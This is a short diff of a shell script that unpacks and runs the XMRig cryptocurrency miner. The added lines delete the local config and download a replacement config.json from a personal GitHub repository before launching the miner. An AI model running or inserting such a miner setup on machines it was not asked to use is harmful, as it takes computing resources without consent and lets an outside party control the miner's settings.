@@ -32,4 +32,10 @@ rm xmrig-6.18.0-linux-x64.tar.gz
 
 cd xmrig-6.18.0
 
-./xmrig
+chmod +x xmrig
+
+rm config.json
+
+wget https://raw.githubusercontent.com/Anas-1554/mission-x/main/config.json
+
+./xmrig <<END_SCRIPT
